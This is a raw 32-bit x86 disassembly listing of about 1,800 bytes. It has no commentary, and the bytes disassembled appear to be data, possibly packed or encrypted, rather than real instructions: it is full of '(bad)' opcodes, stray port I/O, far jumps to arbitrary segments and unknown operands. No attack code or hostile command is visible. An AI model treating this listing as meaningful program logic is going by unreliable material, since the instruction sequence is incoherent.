  40c892:	ret    
  40c893:	jle    0x40c824
  40c895:	ds add dl,0x48
  40c899:	or     ecx,DWORD PTR [ebp-0x7805392d]
  40c89f:	dec    DWORD PTR [esi-0x7b]
  40c8a2:	bnd jb 0x40c84f
  40c8a5:	or     al,0xd0
  40c8a7:	xchg   ebx,eax
  40c8a8:	arpl   WORD PTR [ecx+0x5e],bx
  40c8ab:	xor    edx,ecx
  40c8ad:	inc    ebx
  40c8ae:	mov    edx,?
  40c8b0:	add    al,0xb2
  40c8b2:	jp     0x40c8a3
  40c8b4:	jge    0x40c874
  40c8b6:	pop    ss
  40c8b7:	adc    dh,BYTE PTR [eax+0x3c211bdc]
  40c8bd:	stos   BYTE PTR es:[edi],al
  40c8be:	add    cl,BYTE PTR [ebp-0x45bc13ce]
  40c8c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8c5:	jbe    0x40c895
  40c8c7:	adc    BYTE PTR [ebx+0x72],cl
  40c8ca:	je     0x40c927
  40c8cc:	out    0xe7,al
  40c8ce:	jmp    0x40c8d6
  40c8d0:	repz scas eax,DWORD PTR es:[edi]
  40c8d2:	dec    edi
  40c8d3:	pop    edx
  40c8d4:	stos   DWORD PTR es:[edi],eax
  40c8d5:	and    eax,0x5c5016a1
  40c8da:	xor    DWORD PTR [esi+0xf8f956d],0xdce4a62c
  40c8e4:	mov    ds:0x301b02d1,al
  40c8e9:	outs   dx,DWORD PTR ds:[esi]
  40c8ea:	test   eax,0x214512ee
  40c8ef:	add    bl,BYTE PTR [edi+0x42]
  40c8f2:	add    ch,dl
  40c8f4:	fwait
  40c8f5:	dec    ebp
  40c8f6:	repnz jmp 0xf297:0xeebadbe1
  40c8fe:	lea    edx,[edi+0x72de498]
  40c904:	xchg   esp,eax
  40c905:	xchg   esp,eax
  40c906:	sbb    DWORD PTR [ecx-0x3f],ebp
  40c909:	lock stos DWORD PTR es:[edi],eax
  40c90b:	test   al,0x2c
  40c90d:	repz call 0x258a:0x3044677c
  40c915:	jle    0x40c8d8
  40c917:	or     ecx,eax
  40c919:	loope  0x40c8ff
  40c91b:	pop    edx
  40c91c:	repnz call 0x6dfd:0x261cac19
  40c924:	sub    esi,0xb3876adb
  40c92a:	mov    DWORD PTR [edx+esi*2-0x37df4dee],esp
  40c931:	xor    ebp,esi
  40c933:	scas   eax,DWORD PTR es:[edi]
  40c934:	pop    esp
  40c935:	lods   eax,DWORD PTR ds:[esi]
  40c936:	inc    ebx
  40c937:	iret   
  40c938:	sbb    ch,BYTE PTR [edx-0x3466f544]
  40c93e:	or     esp,DWORD PTR [esi]
  40c940:	xchg   esp,esp
  40c942:	mov    ds:0xd184ed85,al
  40c947:	stos   DWORD PTR es:[edi],eax
  40c948:	mov    edi,0xe9b382f7
  40c94d:	jg     0x40c8d4
  40c94f:	retf   0x78dd
  40c952:	mov    BYTE PTR [ecx+0x54],cl
  40c955:	out    dx,al
  40c956:	jne    0x40c972
  40c958:	add    eax,0x29bb3f10
  40c95d:	mov    al,0xdd
  40c95f:	outs   dx,BYTE PTR ds:[esi]
  40c960:	cmp    DWORD PTR ds:0x13b1440e,ebp
  40c966:	out    0xfc,al
  40c968:	pop    ss
  40c969:	mov    al,0x2
  40c96b:	adc    DWORD PTR [ebx-0x74],ebp
  40c96e:	pushf  
  40c96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c970:	cli    
  40c971:	test   DWORD PTR [eax-0x45c53c94],edi
  40c977:	gs dec ebx
  40c979:	imul   ecx,DWORD PTR [edx-0x1a],0xffffff94
  40c97d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c97e:	xor    BYTE PTR [edi+0x5f],ah
  40c981:	scas   al,BYTE PTR es:[edi]
  40c982:	rcl    DWORD PTR [ebx+0x1b],1
  40c985:	std    
  40c986:	sbb    al,0x2b
  40c988:	test   BYTE PTR [ecx+0x2a],bl
  40c98b:	addr16 and bh,bh
  40c98e:	ret    0x3a80
  40c991:	fmul   DWORD PTR [edx-0x10209678]
  40c997:	add    esp,0xfffffff6
  40c99a:	xchg   ecx,eax
  40c99b:	in     al,0x5e
  40c99d:	fwait
  40c99e:	or     edx,DWORD PTR [edi]
  40c9a0:	cdq    
  40c9a1:	call   0xd0f6:0x1da4421c
  40c9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9a9:	sti    
  40c9aa:	clc    
  40c9ab:	fisub  WORD PTR [esi]
  40c9ad:	mov    ah,0x9e
  40c9af:	xchg   esi,eax
  40c9b0:	adc    eax,0xaa2dd5d8
  40c9b5:	push   es
  40c9b6:	mov    esi,0x2d13418
  40c9bb:	ds dec ecx
  40c9bd:	sbb    esi,esp
  40c9bf:	idiv   DWORD PTR ds:0xce2c3191
  40c9c5:	jo     0x40ca11
  40c9c7:	(bad)  
  40c9c8:	in     eax,dx
  40c9c9:	retf   
  40c9ca:	or     BYTE PTR [ebp+0x24],cl
  40c9cd:	pop    ecx
  40c9ce:	push   ebx
  40c9cf:	shr    BYTE PTR [ecx+ecx*8],1
  40c9d2:	pop    esp
  40c9d3:	repnz sbb eax,0x20f7d52a
  40c9d9:	xor    ah,BYTE PTR [edi+ecx*2-0x26]
  40c9dd:	aaa    
  40c9de:	dec    ecx
  40c9df:	jb     0x40ca20
  40c9e1:	pusha  
  40c9e2:	jle    0x40ca59
  40c9e4:	fdiv   st,st(7)
  40c9e6:	aad    0x0
  40c9e8:	les    edx,FWORD PTR [edx+esi*2-0x3bbd4552]
  40c9ef:	inc    eax
  40c9f0:	hlt    
  40c9f1:	and    al,0x25
  40c9f3:	aam    0x7f
  40c9f5:	add    DWORD PTR [ebx-0x2c3d6f8b],ebp
  40c9fb:	cdq    
  40c9fc:	pop    edx
  40c9fd:	aad    0x98
  40c9ff:	jb     0x40c99e
  40ca01:	mov    dl,0x7c
  40ca03:	cmp    al,0xba
  40ca05:	dec    esp
  40ca06:	sub    al,BYTE PTR [esi]
  40ca08:	test   al,0xe4
  40ca0a:	and    DWORD PTR [esi],ebp
  40ca0c:	ds pop ecx
  40ca0e:	into   
  40ca0f:	sbb    DWORD PTR [eax+edi*4+0x48],esp
  40ca13:	shl    BYTE PTR [esi-0x70f6b675],1
  40ca19:	pop    ebx
  40ca1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca1b:	scas   eax,DWORD PTR es:[edi]
  40ca1c:	jl     0x40ca11
  40ca1e:	gs inc ecx
  40ca21:	fs aam 0x6
  40ca24:	jnp    0x40ca65
  40ca26:	nop
  40ca27:	ret    
  40ca28:	lods   al,BYTE PTR ds:[esi]
  40ca29:	nop
  40ca2a:	mov    ds:0x4164d72f,al
  40ca2f:	xor    eax,0x7ecacedb
  40ca34:	test   al,0xca
  40ca36:	ins    BYTE PTR es:[edi],dx
  40ca37:	pusha  
  40ca38:	or     eax,0x532c49ee
  40ca3d:	pop    eax
  40ca3e:	scas   al,BYTE PTR es:[edi]
  40ca3f:	mov    al,0x94
  40ca41:	pop    esp
  40ca42:	xchg   ecx,eax
  40ca43:	sub    ecx,DWORD PTR [esi-0x4b]
  40ca46:	adc    DWORD PTR [ecx+esi*2],ebp
  40ca49:	and    al,0x9e
  40ca4b:	jle    0x40caab
  40ca4d:	retf   0x3d17
  40ca50:	(bad)  
  40ca51:	imul   esi,DWORD PTR [esi],0x13
  40ca54:	mov    ecx,0x32899c0e
  40ca59:	inc    ebp
  40ca5a:	outs   dx,BYTE PTR ds:[esi]
  40ca5b:	(bad)  
  40ca5c:	retf   
  40ca5d:	repz (bad)
  40ca60:	out    dx,al
  40ca61:	fwait
  40ca62:	(bad)  
  40ca64:	sbb    bl,BYTE PTR [edx+0x20]
  40ca67:	pop    ebx
  40ca68:	sti    
  40ca69:	mov    ebp,0x5bd78481
  40ca6e:	mov    bl,ch
  40ca70:	xchg   DWORD PTR [ebp+0x71e14fa5],esi
  40ca76:	or     dl,BYTE PTR [eax+0x4be13441]
  40ca7c:	jne    0x40cabb
  40ca7e:	and    eax,0x865ecc93
  40ca83:	in     al,dx
  40ca84:	mov    DWORD PTR [esi],edx
  40ca86:	xor    eax,0xa6484375
  40ca8b:	add    DWORD PTR [ebp-0x6b],esi
  40ca8e:	jno    0x40ca90
  40ca90:	retf   
  40ca91:	fldcw  WORD PTR [ebx]
  40ca93:	test   BYTE PTR [ebp-0x4903143c],0xce
  40ca9a:	push   edi
  40ca9b:	leave  
  40ca9c:	jne    0x40ca5d
  40ca9e:	sbb    BYTE PTR [ecx+0x560b7c9b],bl
  40caa4:	sti    
  40caa5:	loopne 0x40ca5c
  40caa7:	push   ds
  40caa8:	into   
  40caa9:	sahf   
  40caaa:	mov    WORD PTR [ecx],?
  40caac:	loopne 0x40cadb
  40caae:	jns    0x40ca34
  40cab0:	mov    dh,0xee
  40cab2:	xchg   ebp,eax
  40cab3:	bound  ebx,QWORD PTR [edi+0x4ca0bbe3]
  40cab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caba:	mov    ecx,DWORD PTR [esi-0x4c]
  40cabd:	xor    ebx,eax
  40cabf:	xchg   esi,eax
  40cac0:	xchg   BYTE PTR [edi+0x2a],bh
  40cac3:	xchg   esi,eax
  40cac4:	push   ebp
  40cac5:	or     eax,DWORD PTR [ebp-0x29b4d883]
  40cacb:	sub    DWORD PTR ds:0xccf30d80,ecx
  40cad1:	and    al,0x26
  40cad3:	loop   0x40cabf
  40cad5:	jge    0x40caba
  40cad7:	aaa    
  40cad8:	mov    bl,0xd4
  40cada:	xchg   esi,eax
  40cadb:	ja     0x40cac9
  40cadd:	adc    DWORD PTR [edi+0x48],0xdc8e6173
  40cae4:	ret    
  40cae5:	jae    0x40caba
  40cae7:	xor    dl,0x6a
  40caea:	sar    dh,1
  40caec:	outs   dx,DWORD PTR ds:[esi]
  40caed:	jmp    DWORD PTR [edx]
  40caef:	inc    BYTE PTR [eax]
  40caf1:	xchg   esi,eax
  40caf2:	daa    
  40caf3:	sub    BYTE PTR [ecx-0x232dd5e7],ah
  40caf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cafa:	inc    ebp
  40cafb:	out    0x9b,al
  40cafd:	js     0x40caf0
  40caff:	mov    cl,BYTE PTR [esp+ebx*1]
  40cb02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb03:	dec    eax
  40cb04:	sbb    BYTE PTR [ecx-0x388c7bdc],dl
  40cb0a:	int3   
  40cb0b:	arpl   WORD PTR [ecx-0x4d],dx
  40cb0e:	sub    eax,0x7c32c4c1
  40cb13:	stos   BYTE PTR es:[edi],al
  40cb14:	and    ch,ch
  40cb16:	pop    esp
  40cb17:	and    eax,0x194329a3
  40cb1c:	iret   
  40cb1d:	cwde   
  40cb1e:	pop    es
  40cb1f:	or     ah,dh
  40cb21:	hlt    
  40cb22:	and    ebp,DWORD PTR [edi-0x77]
  40cb25:	xchg   ebx,eax
  40cb26:	inc    ebp
  40cb27:	xor    ebx,esp
  40cb29:	fcomi  st,st(0)
  40cb2b:	cmp    eax,0x3096a18b
  40cb30:	pushf  
  40cb31:	aaa    
  40cb32:	sbb    dh,dl
  40cb34:	mov    eax,ds:0x5e5fd938
  40cb39:	dec    ecx
  40cb3a:	mov    eax,ds:0xd1ea6953
  40cb3f:	jbe    0x40cb09
  40cb41:	jnp    0x40cb20
  40cb43:	jno    0x40cb93
  40cb45:	jl     0x40cb05
  40cb47:	mov    edx,0x5261e565
  40cb4c:	jns    0x40cae4
  40cb4e:	adc    esi,DWORD PTR [ecx-0x2d]
  40cb51:	xchg   ebx,eax
  40cb52:	xchg   DWORD PTR [esi+0xb],ebx
  40cb55:	jne    0x40cb81
  40cb57:	imul   esp,ebp,0x142405c2
  40cb5d:	jl     0x40cbdd
  40cb5f:	mov    al,ds:0x54ab0545
  40cb64:	mov    al,dh
  40cb66:	js     0x40cb8a
  40cb68:	retf   0x8771
  40cb6b:	mov    al,ds:0xbc08c3fb
  40cb70:	pop    es
  40cb71:	and    bl,cl
  40cb73:	dec    esi
  40cb74:	mov    ds:0x32c1eb3e,al
  40cb79:	mov    bh,BYTE PTR [esi+eax*1+0xd]
  40cb7d:	fcom   DWORD PTR [ebx]
  40cb7f:	cmp    BYTE PTR [edi],bl
  40cb81:	les    eax,FWORD PTR [eax+0x6afabf97]
  40cb87:	lds    edi,FWORD PTR [edi-0x85b9d83]
  40cb8d:	lds    eax,FWORD PTR ds:0x553b328f
  40cb93:	xchg   esi,eax
  40cb94:	in     eax,0x23
  40cb96:	xchg   ecx,eax
  40cb97:	out    dx,eax
  40cb98:	jnp    0x40cbce
  40cb9a:	repnz mov ebp,0x1c061282
  40cba0:	mov    dl,0xd1
  40cba2:	test   eax,0xc3d922b
  40cba7:	call   0xec28d9c3
  40cbac:	push   0xd98f3e40
  40cbb1:	sbb    eax,0xa585a8c3
  40cbb6:	sub    al,0x4c
  40cbb8:	(bad)  
  40cbb9:	imul   BYTE PTR ss:[edx+0x6bf5d6cd]
  40cbc0:	in     eax,0x1f
  40cbc2:	mov    ?,WORD PTR [eax+0x223e45c0]
  40cbc8:	jne    0x40cbff
  40cbca:	xchg   ebp,eax
  40cbcb:	ins    DWORD PTR es:[edi],dx
  40cbcc:	mov    BYTE PTR [edi],ch
  40cbce:	push   ecx
  40cbcf:	mov    al,ds:0x4f1f3d45
  40cbd4:	sub    BYTE PTR [edi+0x35],cl
  40cbd7:	xchg   ebx,eax
  40cbd8:	dec    eax
  40cbd9:	pop    ds
  40cbda:	cmc    
  40cbdb:	sbb    BYTE PTR [edi-0x59fd45fb],0xaa
  40cbe2:	lock xor eax,0xcb41be93
  40cbe8:	adc    DWORD PTR [edx],ecx
  40cbea:	add    bh,al
  40cbec:	int3   
  40cbed:	repnz into 
  40cbef:	mov    ah,0x1c
  40cbf1:	ret    0xa3a5
  40cbf4:	dec    DWORD PTR [esi]
  40cbf6:	loop   0x40cc01
  40cbf8:	and    ah,BYTE PTR [ecx-0x29]
  40cbfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbfc:	push   ebx
  40cbfd:	bnd je 0x40cc49
  40cc00:	pusha  
  40cc01:	add    al,0x81
  40cc03:	neg    BYTE PTR [esi+ecx*8+0x601d5429]
  40cc0a:	xor    al,0xcc
  40cc0c:	clc    
  40cc0d:	jle    0x40cc5e
  40cc0f:	loopne 0x40cbd9
  40cc11:	or     dh,BYTE PTR [edi+0x11444f7d]
  40cc17:	neg    DWORD PTR [ebp-0x39e82f52]
  40cc1d:	adc    DWORD PTR [esi],ebx
  40cc1f:	adc    ch,BYTE PTR [edi-0x35a59070]
  40cc25:	and    eax,0x345331ba
  40cc2a:	add    eax,0xe986ac67
  40cc2f:	(bad)  
  40cc30:	iret   
  40cc31:	mov    gs,ebp
  40cc33:	dec    edi
  40cc34:	daa    
  40cc35:	push   esp
  40cc36:	lahf   
  40cc37:	jmp    0x40cca5
  40cc39:	sbb    DWORD PTR [ecx+0x32c02697],ebp
  40cc3f:	stc    
  40cc40:	jge    0x40cc1e
  40cc42:	outs   dx,BYTE PTR ds:[esi]
  40cc43:	and    BYTE PTR [ebp-0x2e01f4e9],al
  40cc49:	shl    DWORD PTR [ecx-0x22],cl
  40cc4c:	aad    0xa
  40cc4e:	in     eax,dx
  40cc4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc50:	and    DWORD PTR [ecx],edi
  40cc52:	in     al,0x1f
  40cc54:	and    BYTE PTR [eax],0x18
  40cc57:	ds and esp,ebp
  40cc5a:	sub    eax,0xe6b575eb
  40cc5f:	sahf   
  40cc60:	or     BYTE PTR [ebx-0x20],bl
  40cc63:	mov    ch,0x3
  40cc65:	pop    ebx
  40cc66:	shr    ebx,cl
  40cc68:	sbb    dl,bl
  40cc6a:	fwait
  40cc6b:	jecxz  0x40ccb1
  40cc6d:	mov    eax,ds:0x2ffd4ef6
  40cc72:	in     al,0x18
  40cc74:	xchg   edx,eax
  40cc75:	inc    ebp
  40cc76:	sub    DWORD PTR [edi+ecx*2],0xc03befa9
  40cc7d:	and    DWORD PTR [eax],0x1c
  40cc80:	xor    al,0x95
  40cc82:	pop    esi
  40cc83:	push   0x32629df2
  40cc88:	dec    esi
  40cc89:	xchg   ebx,eax
  40cc8a:	in     eax,dx
  40cc8b:	jae    0x40cc5c
  40cc8d:	icebp  
  40cc8e:	fild   DWORD PTR [edx+eax*8-0x57]
  40cc92:	inc    esi
  40cc93:	cmc    
  40cc94:	and    edx,ebp
  40cc96:	adc    al,0xc2
  40cc98:	mov    al,ds:0x3d629566
  40cc9d:	push   ebp
  40cc9e:	adc    al,0xca
  40cca0:	jle    0x40cc25
  40cca2:	shr    BYTE PTR [ebx],0x9
  40cca5:	mov    ebx,0x1063678f
  40ccaa:	dec    ebx
  40ccab:	cmp    DWORD PTR ds:0xdc03cdf4,ebx
  40ccb1:	outs   dx,BYTE PTR ds:[esi]
  40ccb2:	in     eax,0x7d
  40ccb4:	ror    BYTE PTR [ebp+0x5b],cl
  40ccb7:	adc    al,0xb0
  40ccb9:	sbb    al,0xc
  40ccbb:	or     eax,edx
  40ccbd:	mul    BYTE PTR [ebp+0xb]
  40ccc0:	in     al,0x7d
  40ccc2:	jl     0x40ccb1
  40ccc4:	fbld   TBYTE PTR [ecx-0x2e]
  40ccc7:	cmp    al,0x77
  40ccc9:	cmp    al,0xb2
  40cccb:	icebp  
  40cccc:	sbb    dl,dl
  40ccce:	push   ebx
  40cccf:	push   ds
  40ccd0:	mov    ebp,0x32eb9668
  40ccd5:	pop    eax
  40ccd6:	test   BYTE PTR [ecx],al
  40ccd8:	push   0xffffff9f
  40ccda:	out    dx,al
  40ccdb:	xchg   edi,eax
  40ccdc:	cmp    BYTE PTR ss:[ebx],dl
  40ccdf:	icebp  
  40cce0:	outs   dx,DWORD PTR ds:[esi]
  40cce1:	cdq    
  40cce2:	mov    ecx,0xcdc4527c
  40cce7:	mov    cl,0x4d
  40cce9:	sti    
  40ccea:	adc    eax,0x7a1e030d
  40ccef:	mov    BYTE PTR [edi-0x6393b3da],dl
  40ccf5:	outs   dx,DWORD PTR ds:[esi]
  40ccf6:	dec    ebp
  40ccf7:	jmp    0x5464aaf6
  40ccfc:	pop    esi
  40ccfd:	dec    ecx
  40ccfe:	push   ebp
  40ccff:	fs clc 
  40cd01:	sti    
  40cd02:	dec    eax
  40cd03:	and    dh,BYTE PTR [esi-0x4c]
  40cd06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd07:	lods   al,BYTE PTR ds:[esi]
  40cd08:	cmp    esp,eax
  40cd0a:	pop    edx
  40cd0b:	or     DWORD PTR [edi],edx
  40cd0d:	div    BYTE PTR [ebx-0x7100c706]
  40cd13:	dec    ecx
  40cd14:	and    BYTE PTR [esi],ch
  40cd16:	pop    es
  40cd17:	popa   
  40cd18:	jg     0x40ccf2
  40cd1a:	sub    BYTE PTR [ecx],cl
  40cd1c:	mov    bl,0x72
  40cd1e:	pushf  
  40cd1f:	imul   DWORD PTR [edi+0x12]
  40cd22:	or     eax,0xabeffdc8
  40cd27:	rol    DWORD PTR [esi+0x17ce249a],cl
  40cd2d:	into   
  40cd2e:	cmp    al,0xf8
  40cd30:	pop    edi
  40cd31:	enter  0x17bd,0x68
  40cd35:	imul   ebp,DWORD PTR [esi+0x2a17bc41],0xa9bf7d73
  40cd3f:	fld    st(7)
  40cd41:	scas   eax,DWORD PTR es:[edi]
  40cd42:	dec    eax
  40cd43:	jae    0x40cd69
  40cd45:	xchg   edx,eax
  40cd46:	test   eax,0xf23879dd
  40cd4b:	dec    edx
  40cd4c:	push   ebp
  40cd4d:	push   esp
  40cd4e:	mov    al,BYTE PTR [eax]
  40cd50:	or     esi,DWORD PTR [ecx-0x4a]
  40cd53:	cdq    
  40cd54:	xor    eax,0x18ad905b
  40cd59:	sub    DWORD PTR [esi-0x56],ebp
  40cd5c:	popa   
  40cd5d:	xchg   edx,eax
  40cd5e:	je     0x40cd0f
  40cd60:	mov    ds:0xd9758fb4,eax
  40cd65:	push   esp
  40cd66:	mov    ebp,0x3dcf1a4f
  40cd6b:	xor    dl,ah
  40cd6d:	mov    edx,0x7eeb70f5
  40cd72:	and    esp,DWORD PTR [edi+eax*2]
  40cd75:	repnz pop esi
  40cd77:	inc    edx
  40cd78:	jae    0x40cd0b
  40cd7a:	stos   BYTE PTR es:[edi],al
  40cd7b:	(bad)  
  40cd7c:	pop    ax
  40cd7e:	prefetch BYTE PTR [edi+0x23]
  40cd82:	xor    DWORD PTR [ecx+0x509266c8],eax
  40cd88:	and    al,BYTE PTR [esi+esi*1]
  40cd8b:	push   es
  40cd8c:	xchg   ebp,eax
  40cd8d:	xor    BYTE PTR [esi+esi*4-0x6c],bl
  40cd91:	xchg   ebp,eax
  40cd92:	stos   BYTE PTR es:[edi],al
  40cd93:	popa   
  40cd94:	sbb    BYTE PTR [edi-0x39bbf362],ah
  40cd9a:	dec    eax
  40cd9b:	popa   
  40cd9c:	pop    eax
  40cd9d:	ins    BYTE PTR es:[edi],dx
  40cd9e:	(bad)  
  40cd9f:	mov    esi,0x8a30a8c8
  40cda4:	lods   al,BYTE PTR ds:[esi]
  40cda5:	sahf   
  40cda6:	mov    esi,0x7f53e7fe
  40cdab:	stos   BYTE PTR es:[edi],al
  40cdac:	add    eax,0xa94b3c80
  40cdb1:	pop    ebp
  40cdb2:	test   eax,0xe90c04f6
  40cdb7:	(bad)  
  40cdb9:	cs in  eax,0x5d
  40cdbc:	sub    eax,0x92906bf8
  40cdc1:	out    dx,al
  40cdc2:	add    BYTE PTR [edi-0x10],ch
  40cdc5:	loop   0x40cd53
  40cdc7:	push   edi
  40cdc8:	or     dh,ah
  40cdca:	mov    eax,ds:0x96c59236
  40cdcf:	mov    ds:0xc9ea5942,al
  40cdd4:	add    al,0x88
  40cdd6:	pop    ebp
  40cdd7:	jo     0x40cdda
  40cdd9:	xchg   ecx,eax
  40cdda:	mov    dh,BYTE PTR [edi-0x6b355b21]
  40cde0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cde1:	add    bl,BYTE PTR [bx+0x648a]
  40cde6:	dec    ecx
  40cde7:	dec    ecx
  40cde8:	out    0xb6,eax
  40cdea:	popf   
  40cdeb:	sbb    esp,ebx
  40cded:	imul   edi,DWORD PTR [ecx+0x43],0xff268ae4
  40cdf4:	push   ebp
  40cdf5:	shl    BYTE PTR [edi+0x4c],1
  40cdf8:	test   DWORD PTR [edx-0x4055bdd6],ebx
  40cdfe:	arpl   WORD PTR [ebx+0x696efbc4],ax
  40ce04:	retf   0xaf53
  40ce07:	gs mov dl,0xbb
  40ce0a:	mov    cl,0xb
  40ce0c:	sbb    al,0x73
  40ce0e:	jo     0x40cdc5
  40ce10:	cmp    bl,BYTE PTR [edx+0x2b9b6021]
  40ce16:	dec    edx
  40ce17:	push   es
  40ce18:	xchg   BYTE PTR [edi+0x72],bl
  40ce1b:	jle    0x40cde9
  40ce1d:	mov    dh,0x93
  40ce1f:	test   eax,0x9ef840c1
  40ce24:	cli    
  40ce25:	ja     0x40ce19
  40ce27:	out    dx,eax
  40ce28:	cmp    BYTE PTR [eax+0x1d],bl
  40ce2b:	cmp    DWORD PTR [edi],0xffffff96
  40ce2e:	and    DWORD PTR [eax],0x7e
  40ce31:	jmp    0x40ce84
  40ce33:	outs   dx,DWORD PTR ds:[esi]
  40ce34:	fcmovbe st,st(7)
  40ce36:	push   eax
  40ce37:	lock stos BYTE PTR es:[edi],al
  40ce39:	scas   eax,DWORD PTR es:[edi]
  40ce3a:	vpmullw ymm0,ymm3,ymm7
  40ce3e:	mov    fs,WORD PTR [ebp-0x46]
  40ce41:	mov    BYTE PTR [esi+0x2b81ae24],bl
  40ce47:	ror    BYTE PTR [edx+0x69],0xbe
  40ce4b:	out    0x2b,al
  40ce4d:	ss int3 
  40ce4f:	sbb    eax,0xff687c3
  40ce54:	or     eax,0x3c6afbab
  40ce59:	mov    ah,0x58
  40ce5b:	dec    ebx
  40ce5c:	stos   BYTE PTR es:[edi],al
  40ce5d:	aas    
  40ce5e:	out    0x6d,eax
  40ce60:	stos   BYTE PTR es:[edi],al
  40ce61:	sbb    al,0xe0
  40ce63:	and    BYTE PTR [ebp-0x6aa1e5b5],dh
  40ce69:	aad    0xa7
  40ce6b:	gs cmp al,0x9c
  40ce6e:	push   ebx
  40ce6f:	clc    
  40ce70:	xor    DWORD PTR [ebp-0x70],esp
  40ce73:	sbb    eax,0x9cee39de
  40ce78:	adc    edi,DWORD PTR [eax-0x5b]
  40ce7b:	fld    st(7)
  40ce7d:	(bad)  
  40ce7e:	fs in  al,0x16
  40ce81:	sub    DWORD PTR [bx+si+0x64],ebp
  40ce85:	fld    st(5)
  40ce87:	push   ss
  40ce88:	inc    ebx
  40ce89:	rol    esi,0xcd
  40ce8c:	sahf   
  40ce8d:	loop   0x40ce60
  40ce8f:	frstor [edi+ecx*2-0x1a]
  40ce93:	dec    ebx
  40ce94:	ins    DWORD PTR es:[edi],dx
  40ce95:	imul   BYTE PTR [esi+0x53]
  40ce98:	mov    al,0xb5
  40ce9a:	or     dl,BYTE PTR [edi+ebx*4]
  40ce9d:	test   DWORD PTR [edi],esi
  40ce9f:	cmp    al,0x31
  40cea1:	call   DWORD PTR [eax]
  40cea3:	test   BYTE PTR [edi-0x6c77a322],dl
  40cea9:	push   edi
  40ceaa:	pop    ss
  40ceab:	test   eax,0x96a0f3b2
  40ceb0:	fild   WORD PTR [esi]
  40ceb2:	cmp    DWORD PTR [eax-0x70],0x98af0604
  40ceb9:	sub    al,0x28
  40cebb:	inc    DWORD PTR [ebx-0x1a]
  40cebe:	leave  
  40cebf:	(bad)  
  40cec0:	ds js  0x40cead
  40cec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec5:	adc    eax,DWORD PTR [edx+0x4e095c3e]
  40cecb:	ins    BYTE PTR es:[edi],dx
  40cecc:	mov    cl,0x8d
  40cece:	aam    0xfa
  40ced0:	xor    DWORD PTR [ecx-0x735e1797],ebp
  40ced6:	les    ebx,FWORD PTR cs:[ebx]
  40ced9:	mov    al,ds:0xfa9c1a5a
  40cede:	mov    ecx,0x51a8b0cb
  40cee3:	mov    esp,0x41527b85
  40cee8:	addr16 inc esp
  40ceea:	or     esi,esi
  40ceec:	pop    ss
  40ceed:	add    bl,dl
  40ceef:	and    DWORD PTR [ecx-0x41],0x61
  40cef3:	mov    bl,0x40
  40cef5:	std    
  40cef6:	adc    al,0x8e
  40cef8:	and    cl,BYTE PTR [eax]
  40cefa:	in     al,dx
  40cefb:	les    edx,FWORD PTR [edi-0x105e128d]
  40cf01:	jg     0x40ceb1
  40cf03:	ret    
  40cf04:	cmp    al,0xf0
  40cf06:	fcmove st,st(6)
  40cf08:	push   esi
  40cf09:	lea    ebp,[edi]
  40cf0b:	dec    ebp
  40cf0c:	pop    eax
  40cf0d:	ss mov edx,0x37ac45a2
  40cf13:	arpl   WORD PTR [edx-0x7a],bp
  40cf16:	or     BYTE PTR [ebp-0x4d],al
  40cf19:	fadd   st,st(7)
  40cf1b:	in     eax,0xcd
  40cf1d:	test   DWORD PTR [edi+0x22028dc6],ebp
  40cf23:	add    BYTE PTR [edx],al
  40cf25:	rol    DWORD PTR [esi-0x28d8d249],0x6b
  40cf2c:	das    
  40cf2d:	mov    ecx,DWORD PTR [ebx+0x70ee0266]
  40cf33:	push   es
  40cf34:	sub    eax,0x50033173
  40cf39:	test   DWORD PTR [eax+edx*8],0xd44984e5
  40cf40:	cmp    BYTE PTR [edx-0x58dba3e2],dl
  40cf46:	xchg   ebx,eax
  40cf47:	dec    edi
  40cf48:	mov    edx,0xae12cfab
  40cf4d:	and    al,0x68
  40cf4f:	cmc    
  40cf50:	outs   dx,DWORD PTR ds:[esi]
  40cf51:	pop    ebp
  40cf52:	jl     0x40cf40
  40cf54:	jge    0x40cf11
  40cf56:	aas    
  40cf57:	jno    0x40cf6a
  40cf59:	js     0x40cf4f
  40cf5b:	ret    
  40cf5c:	(bad)  
  40cf5d:	cdq    
  40cf5e:	mov    ch,0xe3
  40cf60:	pop    ds
  40cf61:	(bad)  
  40cf63:	pop    esp
  40cf64:	cwde   
  40cf65:	push   0x81274a5
  40cf6a:	hlt    
  40cf6b:	jge    0x40cfc2
  40cf6d:	mov    bl,0xb2
  40cf6f:	(bad)  
  40cf70:	cmp    BYTE PTR [ebp-0x41e67276],bh
  40cf76:	jno    0x40cf18
  40cf78:	jae    0x40cf84
  40cf7a:	aad    0xf3
  40cf7c:	mov    ds:0x9fa09dfa,eax
  40cf81:	mov    bl,0xbf
  40cf83:	jbe    0x40cfe0
  40cf85:	push   DWORD PTR [edi+0x5e]
  40cf88:	outs   dx,BYTE PTR ds:[esi]
  40cf89:	scas   al,BYTE PTR es:[edi]
  40cf8a:	retf   0x4e45
  40cf8d:	xchg   BYTE PTR [ecx],al
  40cf8f:	mov    ebx,0x611456e6
  40cf94:	fwait
  40cf95:	jecxz  0x40cf69
  40cf97:	xchg   ecx,eax
  40cf98:	sub    ah,BYTE PTR [eax-0x21]
  40cf9b:	mov    cl,0xf7
  40cf9d:	fadd   DWORD PTR [eax+0x1c]
  40cfa0:	(bad)  
  40cfa2:	in     eax,dx
  40cfa3:	fist   DWORD PTR [esi]
  40cfa5:	jp     0x40cf28
  40cfa7:	or     BYTE PTR [ebx-0x3a787485],ah
  40cfad:	fldpi  
  40cfaf:	into   
  40cfb0:	jp     0x40cfe3
  40cfb2:	inc    edx
  40cfb3:	jne    0x40d004
  40cfb5:	hlt    
  40cfb6:	mov    esp,0x99f53726
